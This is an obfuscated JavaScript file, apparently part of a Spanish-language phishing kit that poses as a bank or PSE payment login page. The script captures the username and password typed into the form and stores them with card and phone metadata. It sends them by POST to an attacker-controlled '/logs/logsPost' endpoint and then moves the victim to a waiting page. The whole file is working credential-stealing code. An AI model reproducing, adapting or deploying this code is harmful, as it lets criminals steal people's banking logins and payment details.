function _0x49b9() {
  const _0x418407 = [
    "getElementById",
    "dudename",
    "3100kOyxTt",
    "txtPass",
    "4002865mFXONG",
    "href",
    "1947642bxpXtg",
    "27876VPDLtT",
    "setItem",
    "error",
    "1071692jkMZLW",
    "telnum",
    "click",
    "PSE",
    "Network\x20response\x20was\x20not\x20ok",
    "json",
    "3456ESDnTE",
    "focus",
    "preventDefault",
    "12661EbzpWI",
    "Error:",
    "btnUsuario",
    "14WVfOOj",
    "🟥\x20D4viv1end4",
    "327FCZrlm",
    "user",
    "then",
    "info",
    "application/json",
    "495MKVXgG",
    "10387CDbTtp",
    "value",
    "metaInfo",
    "21296pTFKDc",
    "disabled",
    "log",
    "catch",
    "stringify",
    "addEventListener",
    "1oelWxO",
    "POST",
  ];
  _0x49b9 = function () {
    return _0x418407;
  };
  return _0x49b9();
}
const _0x986e56 = _0x13a2;
(function (_0x1c5b16, _0x2298a5) {
  const _0x5a57c8 = _0x13a2,
    _0x573988 = _0x1c5b16();
  while (!![]) {
    try {
      const _0x299f9d =
        (parseInt(_0x5a57c8(0x14f)) / 0x1) *
          (parseInt(_0x5a57c8(0x15b)) / 0x2) +
        (-parseInt(_0x5a57c8(0x140)) / 0x3) *
          (-parseInt(_0x5a57c8(0x161)) / 0x4) +
        -parseInt(_0x5a57c8(0x155)) / 0x5 +
        (-parseInt(_0x5a57c8(0x157)) / 0x6) *
          (parseInt(_0x5a57c8(0x13e)) / 0x7) +
        (parseInt(_0x5a57c8(0x149)) / 0x8) *
          (-parseInt(_0x5a57c8(0x145)) / 0x9) +
        (parseInt(_0x5a57c8(0x153)) / 0xa) *
          (-parseInt(_0x5a57c8(0x164)) / 0xb) +
        (parseInt(_0x5a57c8(0x158)) / 0xc) * (parseInt(_0x5a57c8(0x146)) / 0xd);
      if (_0x299f9d === _0x2298a5) break;
      else _0x573988["push"](_0x573988["shift"]());
    } catch (_0x4b11dd) {
      _0x573988["push"](_0x573988["shift"]());
    }
  }
})(_0x49b9, 0x82264);
function updateLS() {
  const _0x106cd1 = _0x13a2;
  LS[_0x106cd1(0x159)](_0x106cd1(0x143), JSON[_0x106cd1(0x14d)](info));
}
function _0x13a2(_0x53283c, _0x262ae) {
  const _0x49b9a6 = _0x49b9();
  return (
    (_0x13a2 = function (_0x13a2dd, _0x389efa) {
      _0x13a2dd = _0x13a2dd - 0x13d;
      let _0x1b6d4a = _0x49b9a6[_0x13a2dd];
      return _0x1b6d4a;
    }),
    _0x13a2(_0x53283c, _0x262ae)
  );
}
const button = document["getElementById"](_0x986e56(0x13d)),
  userInput = document[_0x986e56(0x151)]("txtUsuario"),
  passInput = document[_0x986e56(0x151)](_0x986e56(0x154));
console[_0x986e56(0x14b)](info[_0x986e56(0x148)]),
  button[_0x986e56(0x14e)](_0x986e56(0x15d), async function (_0x3792cb) {
    const _0x2303f = _0x986e56;
    _0x3792cb[_0x2303f(0x163)](), (button["disabled"] = !![]);
    if (userInput[_0x2303f(0x147)] == "" && passInput[_0x2303f(0x147)] == "") {
      alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
        userInput[_0x2303f(0x162)](),
        (button[_0x2303f(0x14a)] = ![]);
      return;
    } else {
      var _0x2d29cd = userInput[_0x2303f(0x147)],
        _0x1e058c = passInput[_0x2303f(0x147)];
      (info[_0x2303f(0x148)][_0x2303f(0x141)] = _0x2d29cd),
        (info[_0x2303f(0x148)]["puser"] = _0x1e058c),
        updateLS();
      const _0x56dc68 = {
        reg: info["metaInfo"]["cc"],
        name: info[_0x2303f(0x148)][_0x2303f(0x152)],
        cl: info["metaInfo"][_0x2303f(0x15c)],
        us: info[_0x2303f(0x148)][_0x2303f(0x141)],
        ps: info["metaInfo"]["puser"],
        bn: _0x2303f(0x13f),
        status: "Ingresó\x20datos",
        fuente: _0x2303f(0x15e),
      };
      fetch(url + "/logs/logsPost", {
        method: _0x2303f(0x150),
        headers: { "Content-Type": _0x2303f(0x144) },
        body: JSON[_0x2303f(0x14d)](_0x56dc68),
      })
        [_0x2303f(0x142)]((_0x53cc6d) => {
          const _0x4463dd = _0x2303f;
          if (!_0x53cc6d["ok"]) throw new Error(_0x4463dd(0x15f));
          return _0x53cc6d[_0x4463dd(0x160)]();
        })
        [_0x2303f(0x142)]((_0x3d10e7) => {
          const _0x224025 = _0x2303f;
          window["location"][_0x224025(0x156)] = "./wait.html";
        })
        [_0x2303f(0x14c)]((_0x889960) => {
          const _0x110a5a = _0x2303f;
          console[_0x110a5a(0x15a)](_0x110a5a(0x165), _0x889960),
            (button[_0x110a5a(0x14a)] = ![]);
        });
    }
  });
